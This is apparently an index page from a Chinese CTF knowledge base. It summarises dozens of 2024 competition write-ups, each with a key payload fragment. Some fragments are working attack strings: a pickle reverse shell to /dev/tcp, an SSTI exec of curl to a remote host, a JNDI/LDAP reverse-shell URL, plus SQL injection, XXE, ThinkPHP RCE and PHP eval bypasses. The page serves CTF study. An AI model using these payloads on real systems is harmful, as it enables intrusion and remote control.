- L3HCTF 2024：Windows CryptoAPI + 魔改 TEA + brotli XOR + LCS DP + vm2 sandbox 逃逸 + Fibonacci/gauss… → `Symbol.for(''nodejs.util.inspect.custom'') # vm2 沙箱逃逸`；vm2 沙箱可被 Symbol.for('nodejs.util.inspect.custom') 配合 WebAssembly.…

### 2024 L3akCTF（1 篇）
- L3akCTF 2024 多类型 Web (Puppeteer cookie / PHP eval 8 进制绕过 / JWT kid 路径 / SQLite SQL 注入) 速查。

### 2024 Mapna CTF（1 篇）
- Mapna CTF 2024 purify: Puppeteer bot + WebAssembly DOMPurify (purify.c) 字节级 sanitize，buf 0x1000… → `/`；/

### 2024 Move CTF（1 篇）
- Move CTF 2024 (Sui/Move 生态) ZAN + 蚂蚁天穹 联合战队第 8 名: DP 矩阵 + DEX flash loan + Subset sum 求解。

### 2024 NKCTF（1 篇）
- NKCTF 2024 Polaris 战队: ThinkPHP 反序列化 (Windows 类) + KodExplorer Mcrypt 加密 (RC4-like) + 弱密码爆破。 → `/`；/

### 2024 NUMEN CTF（1 篇）
- NUMEN CTF ChaMd5: Solidity 智能合约多道 (ExistingStock 任意 transferFrom/approve + SmartCounter delegat…

### Patriot CTF 2024（1 篇）
- Patriot CTF 2024 狼组 WP 大全：Web (X-Forwarded/Session 伪造/XSS/XXE/EJS RCE) + Crypto (SHA-1 长度扩展) +… → `ejs poc=settings[view options][escape]={}.constructor.constructor("return process.mainModu…`

### 2024 RealWorldCTF（2 篇）
- Real World CTF 6th 2024 MinIO 多个高危漏洞研究，Windows 提权/Linux PostPolicy/集群 env 泄漏/MINISIGN 配错 RCE。 → `PostPolicy multipart 大写 Content-Type Windows 路径 \ MINIO_UPDATE_MINISIGN_PUBKEY 未设`
- Real World CTF 6th 2024 体验赛 6 道题官方 WP，覆盖 Ofbiz Groovy RCE/Struts2 上传/Shiro AES 反序列化/ActiveMQ Sp… → `Ofbiz groovyProgram Struts2 filename=../../../views/a.jsp Shiro key=kPH+bIxk5D2deZiIxcaaaA…`

### 2024 RealWorldCTF 6th(0解薛定谔赛题)（1 篇）
- RWCTF6th PyGhost 0解薛定谔题:Windows服务matplotlib+PyInstaller _rmtree_unsafe symlink TOCTOU LPE。 → `PyInstaller _rmtree_unsafe+symlink TOCTOU + matplotlib C:\Windows\Temp + named pipe + os.s…`

### 2024 Ricotecki CTF (XS3)（1 篇）
- XS3 (ricotecki) 17 关 S3 contentType 过滤 bypass + Cognito Identity Pool 临时凭据 + s3 sync 拉 specialf… → `{"contentType":"text/html;x=image/png"} / 17 关渐进式 contentType 过滤 / aws cognito-identity ge…`

### 2024 SCTF（1 篇）
- SCTF 2024：factory 菜单 ret2libc + 自定义 VM shellcode + Go .rodata 拼接 + 内核 userfaultfd tty 劫持。 → `tty_struct[12] = WORK_FOR_CPU_FN # kernel EoP`；tty_struct[12] = work_for_cpu_fn + commit_creds(0) 是 Linux 内核 EoP…

### 2024 SHCTF（1 篇）
- 看雪 ctfiot 招新 Week2 完整 WP，涵盖 Crypto/JWT/Pickle/Flask/Pwn/Reverse 多类基础题。 → `-1") union select 1,scretdata from ctf.flag`；当 pickle 显式 import 黑名单时，要想到 posix.system 这类「带前缀的等价模块」常被遗忘在黑名单。

### 2024 Shakti CTF（1 篇）
- Shakti CTF 2024 混合题：Cookie 伪造 + JWT 爆破 + PHP 异或绕过黑名单。 → `eval(("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE"))`；PHP preg_match 黑名单在过滤单字符时常用 XOR/自增绕过。

### 2024 TFC CTF（1 篇）
- TFC CTF 2024 狼组 writeup：Pug SSTI RCE + 多线程 ret2libc + fastbin attack __malloc_hook。 → `%{global.process.mainModule.constructor._load("child_process").exec(''curl ip:7001/r.txt/b…`

### 2024 TJCTF（1 篇）
- TJCTF 2024 多类 (Web/Reverse/Forensics)：JWT jku 路径穿越 + Flask SSTI + WebSocket 抢答。 → `jwt.encode + jku=''../uploads/<uuid>/<file>'' # 路径穿越 jku`；JWT jku 字段直接拼到文件系统路径时，../ 序列允许加载攻击者控制的公钥 → 签名伪造。

### 2024 TamuCTF（1 篇）
- TamuCTF 2024 狼组：Web 反序列化+SQL注入+CBC翻转 + Pwn fmt+canary+sandbox 盲注 + Reverse AES 动调。 → `newiv[i] = plain[i] ^ iv[i] ^ decode_plain[i]`；AES-CBC IV 翻转是经典 admin 0→1 trick；sandbox 沙箱 + shellcode 时用 exit_g…

### 2024 UIUCTF（1 篇）
- UIUCTF 2024 狼组：MD5 binary SQL 注入 + syscall sandbox 盲注 + z3 矩阵 + OSINT 系列。 → `SQL: ''or 1; (MD5 bytes 形式)`；MD5 输出是 16 字节二进制而非 16 进制；用 latin1 转换可含 'or' SQL 注入字符。

### UKFC2024 / CISCN 国赛（1 篇）
- UKFC2024 CISCN 国赛多 WP 合并：PHP_CMS 命令注入 + QR SSRF + frame 反射 + House of Apple + CryptoAPI + 魔改 TE… → `SELECT * FROM PHP_CMS.F1ag_Se3Re7`；跨 frame 反射 (generator) 在沙箱逃逸中是强大攻击面；House of Apple 配合 setcontext+…

### 2024 UTCTF（1 篇）
- UTCTF 2024 Min-Venom：HTTP Range /proc/self/mem 爆破 + 整数溢出 count + baby RSA + LFSR 爆破。 → `count=10000000000 (整数溢出 → 获得 10000)`；HTTP Range + 目录穿越 + 内存段爆破 是绕过 flag.txt 删除的经典手法。

### WMCTF 2024（1 篇）
- WMCTF 2024 星盟安全 5 题 WP，QLExpress JNDI+LDAP 反弹 shell + LLVM IR 调用链 + K-Cessation 64 位转轮方程组求解 + L… → `a.dataSourceName="ldap://112.124.59.213:1389/Deserialize/CommonsBeanutils194/ReverseShell/…`

### 2024 aliyunCTF HappyTree（1 篇）
- aliyunCTF HappyTree WriteUP：Solidity Merkle Tree 验证合约 b(leafs, proofs, indexs) 接收 3 个 leaf + 4… → `leafs = [0x81376b..., 0x28cac3..., 0x804cd8..., 0x9b1a0a45cfdc60f45820808958c1895d44da61c8…`

### 2024 encrypt-labs / 加密对抗靶场（1 篇）
- encrypt-labs 8 关通关：对称/AES/RSA/混合/DES/HmacSHA256/防重放/服务端签，最关键是替换 JS 固定 key 和弱口令。；加密对抗核心思路: 1) 抓包定位算法位置 2) 提取 key/iv (硬编码/可预测/可替换 JS) 3) autodecode…

### 2024 osu!gaming（1 篇）
- osu!gaming CTF 2024 writeup：Express 路径遍历 + purify 后 XSS + WebSocket BPM 伪造。 → `purify 后处理 + youtube BBCode XSS + BPM 伪造`；''purify.sanitize 后再做字符串处理是经典 XSS 绕过模式。''

### 2024 solar杯（1 篇）
- 第一届 Solar 杯应急响应挑战赛官方 WP，GeoServer 入侵 + Tomcat JSP 动态类 + 流量解密 + 333.exe 工具。 → `xc 解密密钥 GeoServer b.jsp 333.exe flag{sA4hP_89dFh_x09tY_lL4SI4}`；应急响应三大模块：流量分析 + 文件排查 + webshell 还原；Tomcat work 目录是 JSP 动态类缓存；xc 作…

### 2024 ssti-challenge（1 篇）
- Thymeleaf SSTI 3 层防护绕过，S2-061 + Jackson + SpEL 完整利用链。 → `S2-061 InstanceManager + Jackson + SpEL + MLet`；当 SSTI 阻断 '$$' 和 'new' 时，可以借助 InstanceManager 实例化类。

### 2024 乌托邦·王的实验室 24（1 篇）
- asyncio 300 个 TCP 并发触发补贴接口 TOCTOU 漏洞刷钱买 10000 特供商品拿 flag。；TOCTOU 漏洞在状态机类业务接口（限领/限购/限次）中常出现；asyncio 预建连接 + Event 同步触发是高并发竞态标…

### 2024 多个（1 篇）
- Orange Tsai 大佬回忆录：PHP 内核 + CTF 二十年 + 真实 CVE + FSOP + LFI 进化 + PHAR 反序列化 + Scoreboard 0day。 → `new $model() + Throwable $name`；CTF 不只是比赛，是研究交流的社区；Orange Tsai 真实 0day 经验 (Exchange/SSL VPN/Apach…

### 2024 安全研究文章（1 篇）
- Linux page cache写穿漏洞：AF_ALG+splice in-place污染只读文件 → `op.sendmsg([aad],cmsg,MSG_MORE); os.splice(target_fd,pipe_w,t+4,offset_src=0); os.splice(p…`；容器共享page cache导致只读volume可写；AF_ALG sendmsg/splice是攻击面

### 2024 巅峰极客（1 篇）
- FastAPI 内存马 + symlink TOCTOU + ECDSA 线性组合 + 多 k 爆破 + 哈希流密码逐位爆破。 → `app.__init__.__globals__['__builtins__']['exec'](code) ; symlink("/usr/bin/mkdir", "/sandb…`；ECDSA nonce k 线性组合时已签名点线性组合 → 还原私钥；symlink 攻击通过并发改写 phpcode 路径。

### 2024 强网拟态（1 篇）
- 原型链污染 + pickle 内存马 + phar:// 反序列化 + JVM-SANDBOX uninstall。 → `{"username": 1, "password": 1, "__init__": {"__globals__": {"safe_modules": ["os", "builti…`；Python 原型链污染必须显式允许 safe_modules=['os','builtins'] 才有效；JVM-SANDBOX…

### 2024 斟茶王者 (战队模式) 复盘（1 篇）
- 斟茶王者战队模式 15 题复盘：银行流水/重明/二维码/Android SDK/AES-CBC/Electron XSS+内网穿透综合实战。；涉网犯罪研判复合型 + Electron preload.js execCommand(1818) + this.parent c…

### 2024 斟茶王者 复盘 (赵剑)（1 篇）
- 斟茶王者复盘 (赵剑) 15 题 + 命题建议：模糊查询/不重置/robots.txt 提示。；涉网犯罪研判赛事核心: 银行模糊查询 + AndroidManifest SDK + AES key/iv 分段; 复盘建议关注用…

### 2024 斟茶王者 涉网犯罪研判（1 篇）
- 斟茶王者 16 题涉网犯罪研判复盘：银行流水/调证/二维码/SDK/爬虫/SQL/Electron XSS RCE 综合实战。；涉网犯罪研判核心: 1) 银行流水借贷标志位 2) 调证平台 3) 案件卷宗 4) Android SDK 5) Electron…

### 2024 春秋云境 2022 网鼎杯决赛（1 篇）
- 春秋云境仿真场景 2 个靶场复盘：XR Shop 4 flag 内网渗透 + 网鼎杯 2022 复盘 WordPress+永恒之蓝+CVE-2022-26923。；内网渗透标准流程: 端口扫描 → Web 弱口令 → 内网信息收集 (Jenkins/Gitlab) → 数据库 (Oracle/…

### 2024 春秋云境仿真场景（1 篇）
- 春秋云境Initial仿真场景：ThinkPHP5 RCE+MS17-010+DCSync三段式内网 → `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls;sudo mysql -e '!…`；入门级内网靶场核心三件套：web RCE入口→MSF永恒之蓝→DCSync域控

### 春秋杯2024冬季赛（1 篇）
- 春秋杯2024冬季赛D3多题：ezUpload pickle+AES-ECB+unicode绕WAF+reproduction流量盲注模拟 → `AES.new(key=b'UpLOad_encr7Pt3d', MODE_ECB);pickle unicode escape \u0062\u0069 etc;pickle V…`；pickle WAF绕过用unicode转义(\u0062\u0069)替代敏感字符，AES+反序列化组合利用

### 2024 看雪论坛 ctfiot 系列（1 篇）
- 从 Linux VFS/inode/cred 结构体内核视角看 SetUID 工作机制，配合漏洞示例演示 setuid 提权 + 命令注入实战。 → `./set_uid_example "233333 ; /bin/sh" → root shell`；SetUID 加载时把 euid 改成文件属主 uid；snprintf + system 拼接用户输入是经典命令注入；fd 已…

### 2024 第三届广东省大学生网络攻防竞赛（1 篇）
- 第三届广东大学生网安赛：php://filter文件包含+phar反序列化 → `php://filter/convert.iconv.UTF-8.UCS-2/resource=/flag;www.tar.gz;phar生成:phar->setStub('GIF…`；phar协议反序列化是PHP文件上传常见漏洞链

### 2024 第三届黄河流域公安院校网络空间安全技能挑战赛（1 篇）
- 第三届黄河流域公安院校挑战赛官方WP：.user.ini包含+CSP绕过XSS+JSP文件包含+路径穿越 → `auto_prepend_file=/var/log/nginx/access.log;UA头写马;max_input_vars=1000;CSP bypass;isValidUs…`；.user.ini可作为LFI目标；max_input_vars=1000触发Warning致header失败可绕过CSP

### 2024 网鼎杯（1 篇）
- 网鼎杯拟赛 Writeup，签到题 + Web 文件上传改后缀 bypass。 → `/upload.php .png 改 .php Content-Type: multipart/form-data`；文件上传经典 bypass：先传 .png 再 Burp 改后缀；Content-Type 检查可绕过；后门落地用中国蚁剑/菜刀。

### 2024 羊城杯（1 篇）
- Flask pickle cookie + Tomcat conf 覆盖 PUT 上传 jsp。 → `opcode=b'(cos\nsystem\nS'bash -c "bash -i >& /dev/tcp/VPS/3333 0>&1"'\no.' ; secret="Enjoy…`；Tomcat conf/web.xml 覆盖 + PUT 启用 readonly=false 即可上传 .txt 当 jsp 解析…

### 2024 蓝桥杯网络安全（1 篇）
- 第十五届蓝桥杯网络安全7题:robots.txt+流量包追踪+DWT水印+Arnold逆+yafu分解RSA(差206)+魔改XXTEA(rounds=(415/n)+114)+RC4(ga… → `/robots.txt + 追踪流/pavilion (DWT+Arnold)/yafu factor(n=945810286829001131236487349377846346…`

### 2024 长城杯（2 篇）
- SQL %% + .htaccess + 数字 md5 爆破 + 原型链污染 + SSTI 八进制 + pwn 3 题。 → `username=admin&password=%% ; .htaccess: AddType application/x-httpd-php .xxx ; flask-unsig…`；数字 md5（如 0cc175b9c0f1b6a831c399e269772661 = md5('a')）是单字节爆破关键；Fla…
- 第四届长城杯京津冀初赛(2024-09)ChaMd5 Mini-Venom:oa.access.log awk统计最频繁IP+md5爆破日志中MD5→flag+Flask session伪造… → `cat oa.access.log/awk ''{print $1}''/uniq -c/sort -nr/md5(chr(k) for k in 32..127)/python…`

### 2024 领航杯（1 篇）
- XXE OOB + Aiohttp 目录穿越 + Redis dump + PG docker 恢复 + RSA AMM 33次方。 → `<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % file SYSTEM "php://filter/read=convert.base64…`；aiohttp 3.9.1 之前都有 CVE-2024-23334 目录穿越；RSA p^2 接近 n 时 p = next_pr…

### 2024 高校网络安全管理运维赛（1 篇）
- 高校网络安全管理运维赛WP集合,涵盖PWN栈溢出+RE bitwise爆破+WEB JWT/MongoDB/Pickle/SSRF/XXE+MISC ZIP钓鱼邮件DKIM综合,运维安全方向… → `admin'//1 + CVE-2019-9740 CRLF redis SET pickle exec`；高校运维赛常见考点组合:Python 3.7+urllib CRLF CVE是稳定SSRF向量,MongoDB updateOne…

### 2024 黄河流域网络攻防竞赛决赛（1 篇）
- AWDP赛制7题(WEB×4+PWN×3),核心链为SSRF+gopher+SQL注入+302跳转三层跳板打backup exec实现RCE,Flask密码爆破+SSTI,sign签名md5… → `gopher://127.0.0.1:80/_POST%20/api.php%3Faction%3Dbackup%20HTTP/1.1...%7B%22path%22%3A%22%…`

## Connections

- 上层索引：[[ctf/source-corpus--des-ctf-knowledge]]
- Source: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)

## Open Questions

- 本页为索引层，题目细节请回源；若某场比赛多题值得展开，再单独建 `ctf/<比赛>.md` 实体页。
